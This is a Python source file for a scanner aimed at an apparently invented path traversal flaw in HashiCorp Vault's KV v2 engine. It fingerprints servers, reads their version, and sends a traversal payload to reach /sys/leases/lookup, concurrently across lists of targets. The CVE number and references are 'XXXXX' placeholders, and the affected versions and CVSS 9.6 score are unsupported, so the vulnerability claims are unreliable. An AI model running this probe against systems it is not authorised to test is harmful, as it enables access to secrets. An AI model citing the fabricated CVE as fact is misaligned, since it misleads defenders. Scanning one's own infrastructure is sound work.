#!/usr/bin/env python3
"""
HashiCorp Vault KV v2 Path Traversal Scanner
============================================
This is a security scanner for detecting a path traversal vulnerability in HashiCorp Vault server
when using the KV v2 secrets engine. The vulnerability (CVE-2026-XXXXX) allows unauthorized attackers
to traverse paths and access secrets stored in Vault if they can manipulate input into the API endpoints.

CVE-2026-XXXXX details:
  - Affects certain configurations of HashiCorp Vault when the KV v2 secrets engine is used.
  - Exploiting the issue enables attackers to exfiltrate secrets using crafted API requests.
  - The vulnerability scores CVSS 9.6, making it critical.

This scanner attempts to identify susceptible Vault instances. It can detect usage
of the KV v2 secrets engine, determine the Vault version, and check for path traversal
vulnerability within affected versions.

Dependencies:
  - `httpx` (for asynchronous HTTP requests)
  - Python 3.10+ required

Usage:
  # Scan a single target for the vulnerability
  python vault_kv_v2_path_traversal_scanner.py --target http://vault.yourcompany.com:8200

  # Scan multiple targets using a file
  python vault_kv_v2_path_traversal_scanner.py --list targets.txt --output results.json

  # Perform detection only without exploitation attempts
  python vault_kv_v2_path_traversal_scanner.py --target http://vault.yourcompany.com:8200 --safe

  # Set custom concurrency levels for bulk scanning
  python vault_kv_v2_path_traversal_scanner.py --list targets.txt --concurrency 50

References:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-XXXXX
  - https://github.com/hashicorp/vault/issues/XXXXX
  - https://discuss.hashicorp.com/latest
"""

import argparse
import asyncio
import json
import re
import sys
from urllib.parse import urljoin

import httpx

# Constants
SEMAPHORE_LIMIT = 30
REQUEST_TIMEOUT = 8
VAULT_FINGERPRINTS = [
    '"type":"response","auth"',
    '"secrets_capabilities"',
    '"Vault"'
]
VULN_FIXED_VERSION = (1, 14, 0)  # Represents the fixed version: 1.14.0
TRAVERSAL_PAYLOAD = '/v1/secret/data/../../sys/leases/lookup'
EXPECTED_RESPONSE_KEYS = ["lease_id", "lease_duration", "renewable"]

# ANSI color codes
RED = '\033[91m'
YELLOW = '\033[93m'
GREEN = '\033[92m'
RESET = '\033[0m'


# Helper Functions
def parse_version(version_string: str):
    """Parse a version string into a tuple (major, minor, patch)."""
    try:
        return tuple(map(int, version_string.split('.')))
    except ValueError:
        return None


def is_vulnerable(version: str):
    """Check if the version is vulnerable."""
    parsed = parse_version(version)
    if not parsed:
        return False
    return parsed < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Ensure the URL contains a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


# Core Scanner Functions
async def detect_vault(client, base_url, semaphore):
    """Detect if the target is running a HashiCorp Vault server."""
    async with semaphore:
        try:
            response = await client.get(base_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                for fingerprint in VAULT_FINGERPRINTS:
                    if fingerprint in response.text:
                        return True
        except httpx.RequestError:
            pass
    return False


async def extract_vault_version(client, base_url, semaphore):
    """Attempt to extract the HashiCorp Vault version."""
    async with semaphore:
        version_url = urljoin(base_url, "/v1/sys/health")
        try:
            response = await client.get(version_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                match = re.search(r'"version":"([\d.]+)"', response.text)
                if match:
                    return match.group(1)
        except httpx.RequestError:
            pass
    return None


async def check_path_traversal(client, base_url, semaphore, safe_mode):
    """
    Check if the target is vulnerable to the KV v2 path traversal.

    Returns:
        - True if the target is found to be vulnerable (only if safe_mode is False).
        - None if only detection was performed (safe_mode=True).
        - False otherwise.
    """
    if safe_mode:
        return None

    async with semaphore:
        test_url = urljoin(base_url, TRAVERSAL_PAYLOAD)
        try:
            response = await client.get(test_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                if all(key in response.text for key in EXPECTED_RESPONSE_KEYS):
                    return True
        except httpx.RequestError:
            pass
    return False


async def process_target(client, target, semaphore, safe_mode):
    """Process a target and check for the vulnerability."""
    target_url = normalize_url(target)
    is_vault = await detect_vault(client, target_url, semaphore)

    if not is_vault:
        return {"target": target, "status": "Not a Vault instance"}

    version = await extract_vault_version(client, target_url, semaphore)
    is_vuln = False

    if version:
        vulnerable = is_vulnerable(version)
        if vulnerable and not safe_mode:
            is_vuln = await check_path_traversal(client, target_url, semaphore, safe_mode)
        status = f"Vulnerable to path traversal: {is_vuln}" if is_vuln else "Not vulnerable"
    else:
        status = "Vault version not detected"

    return {
        "target": target,
        "vault_detected": is_vault,
        "version": version,
        "vulnerable": is_vuln if not safe_mode else None,
        "status": status
    }


async def main(args):
    """Main entry-point for asynchronous scanning."""
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        if args.list:
            with open(args.list, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        else:
            targets = [args.target]

        tasks = [
            process_target(client, target, semaphore, args.safe)
            for target in targets
        ]
        results = await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(results, f, indent=4)
    for result in results:
        print_result(result)


def print_result(result):
    """Pretty print the result with ANSI color codes."""
    if "vault_detected" in result and result["vault_detected"]:
        if result["vulnerable"]:
            print(f"{RED}[CRITICAL]{RESET} {result['target']} is vulnerable to CVE-2026-XXXXX!")
        else:
            print(f"{YELLOW}[INFO]{RESET} {result['target']} is running Vault {result['version']} ({result['status']})")
    else:
        print(f"{GREEN}[INFO]{RESET} {result['target']}: {result['status']}.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HashiCorp Vault KV v2 Path Traversal Scanner")
    parser.add_argument("--target", help="Single target URL/IP for scanning")
    parser.add_argument("--list", help="File containing a list of target URLs/IPs")
    parser.add_argument("--output", help="File to save the JSON results")
    parser.add_argument("--safe", action="store_true", help="Enable detection only mode (no exploit attempts)")
    parser.add_argument("--concurrency", type=int, default=10, help="Concurrency limit for async requests (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification (not recommended)")
    args = parser.parse_args()

    if not args.target and not args.list:
        parser.error("You must specify either --target or --list")

    asyncio.run(main(args))
